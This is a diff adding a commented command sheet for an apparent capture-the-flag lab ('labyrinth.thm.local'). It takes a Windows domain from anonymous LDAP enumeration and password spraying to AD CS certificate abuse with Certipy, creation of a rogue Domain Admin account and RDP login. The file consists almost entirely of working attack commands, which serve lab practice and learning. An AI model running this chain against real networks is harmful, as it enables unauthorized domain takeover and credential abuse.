@@ -1,0 +1,73 @@
+#############################################
+# 1️⃣ Recon & LDAP Enumeration
+#############################################
+
+# Add target host to /etc/hosts for easy resolution
+vim /etc/hosts
+# [ip] labyrinth.thm.local labyrinth
+
+# Enumerate LDAP anonymously for user accounts
+ldapsearch -x -H ldap://10.10.130.213 -b "dc=thm,dc=local" "(objectClass=person)" > ldapresults.txt
+
+# Extract descriptions (can contain passwords)
+cat ldapresults.txt | grep "description"
+
+# Extract sAMAccountName (usernames) to file
+cat ldapresults.txt | grep sAMAccountName: | cut -f2 -d" " > ldap_users.txt
+
+
+#############################################
+# 2️⃣ Password Spraying with Known Password
+#############################################
+
+# Spray all enumerated users against SMB with known default password
+crackmapexec smb 10.10.180.201 -u ldap_users.txt -p 'CHANGEME2023!'
+
+
+#############################################
+# 3️⃣ BloodHound Enumeration (Authenticated)
+#############################################
+
+# Enumerate domain with valid credentials
+sudo bloodhound-python \
+  -d THM.LOCAL \
+  -u IVY_WILLIS \
+  -p 'CHANGEME2023!' \
+  -ns 10.10.130.213 \
+  -c all
+
+
+#############################################
+# 4️⃣ AD CS Enumeration & Abuse with Certipy
+#############################################
+
+# Using Certipy to request a certificate for Administrator (ESC1-like abuse)
+certipy req \
+  -u 'Susanna_McKnight@thm.local' \
+  -p 'CHANGEME2023!' \
+  -dc-ip '10.10.130.213' \
+  -target 'labyrinth.thm.local' \
+  -ca 'thm-LABYRINTH-CA' \
+  -template 'ServerAuth' \
+  -upn 'administrator@thm.local'
+
+# Authenticate with the issued cert and spawn LDAP shell
+certipy auth -pfx administrator.pfx -dc-ip 10.10.130.213 -ldap-shell
+
+
+#############################################
+# 5️⃣ Privilege Escalation in AD
+#############################################
+
+# From LDAP shell, create a new DA account
+add_user Mishky
+add_user_to_group Mishky "Domain Admins"
+
+
+#############################################
+# 6️⃣ Domain Admin Access via RDP
+#############################################
+
+# Log in with the new DA account
+xfreerdp /v:10.10.130.213 /u:THM.LOCAL\\Mishky /p:Password00 \
+  /dynamic-resolution /cert:ignore
